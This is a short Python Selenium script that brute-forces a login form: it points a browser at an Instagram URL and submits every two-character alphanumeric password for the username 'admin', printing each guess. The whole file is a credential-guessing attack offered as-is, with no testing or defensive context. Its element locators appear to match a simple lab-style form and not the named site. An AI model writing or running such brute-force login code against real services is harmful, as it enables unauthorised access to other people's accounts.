import time
from selenium import webdriver

def AutoLogin():

    usernm = "admin"
    userpw = "aa"

    ASCII_list = list(range(48, 58))
    ASCII_list += list(range(65, 91))
    ASCII_list += list(range(97, 123))

    pw_list = list(userpw)

    browser = webdriver.Chrome()

    url = "https://www.instagram.com/?locale=ja_JP"

    browser.get(url)

    for i1 in ASCII_list:
        pw_list[1] = chr(i1)
        for i0 in ASCII_list:
            pw_list[0] = chr(i0)
            userpw = "".join(pw_list)

            login_id = browser.find_element_by_xpath("/html/body/form/div[1]/input")
            login_pw = browser.find_element_by_xpath("/html/body/form/div[2]/input")

            login_id.clear()
            login_id.send_keys(usernm)
            login_pw.clear()
            login_pw.send_keys(userpw)

            login_btn = browser.find_element_by_xpath("/html/body/form/div[3]/input")
            login_btn.click()
            print(userpw)
AutoLogin()